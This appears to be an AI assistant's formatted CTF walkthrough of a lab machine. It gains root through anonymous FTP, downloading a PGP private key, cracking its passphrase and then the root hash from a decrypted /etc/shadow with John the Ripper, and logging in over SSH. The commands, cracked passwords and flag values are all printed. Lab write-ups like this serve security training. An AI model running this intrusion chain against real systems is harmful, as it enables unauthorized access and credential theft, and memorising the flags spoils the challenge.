Perfect 🚀 Here’s a polished **GitHub-ready write-up** of your exploitation path. I’ll structure it cleanly with commands, outputs, and explanations so it’s easy to follow for CTF/THM notes.

---

# VSFTPD & PGP Key Escalation — CTF Walkthrough

## 🔎 Enumeration

First, we scan the target:

```bash
nmap -sV 10.10.128.22
```

**Results:**

```
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
```

FTP is open → check for anonymous login:

```bash
nmap -p21 --script ftp-anon 10.10.128.22
```

✅ **Anonymous login allowed**. We get full access to the filesystem.

---

## 📂 Looting FTP

Navigate to `/home/melodias`:

```bash
ftp> cd /home/melodias
ftp> ls -la
```

Found:

* `user.txt` 606083fd33beb1284fc51f411a706af8
* `.wget-hsts` referencing GitHub Gist
* interesting directories `/tmp` and `/notread`

Check `/notread`:

```bash
ftp> cd /notread
ftp> ls -la
```

Found:

* `backup.pgp`
* `private.asc`

Downloaded both:

```bash
ftp> get private.asc
ftp> get backup.pgp
```

---

## 🔑 Cracking the PGP Key

Import the private key:

```bash
gpg --import private.asc
```

It’s protected with a passphrase. Extract hash for cracking:

```bash
gpg2john private.asc > keyhash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt keyhash.txt
```

**Cracked passphrase:** `xbox360`

---

## 🔓 Decrypting Backup

Now decrypt the backup:

```bash
gpg --decrypt backup.pgp > shadow
```

This revealed `/etc/shadow` contents including `root` and `melodias`.

---

## 💥 Cracking Hashes

Save the hashes to `hashes.txt` and run:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

**Result:**

* root → `hikari`

---

## 🛠️ Exploitation

SSH into the box as root:

```bash
ssh root@10.10.128.22
```

Password: `hikari`

Verify:

```bash
whoami
# root
```

---

## 🎯 Flags

* **User Flag:** `user.txt` in `/home/melodias`
* **Root Flag:**

```bash
cat /root/root.txt
f706456440c7af4187810c31c6cebdce
```

---

## 📝 Summary

1. Anonymous FTP → browse filesystem
2. Found PGP key & encrypted backup
3. Cracked passphrase (`xbox360`) with `john`
4. Decrypted backup → obtained `/etc/shadow`
5. Cracked root hash (`hikari`)
6. SSH root access → captured flags

💀 **Full system compromise achieved.**
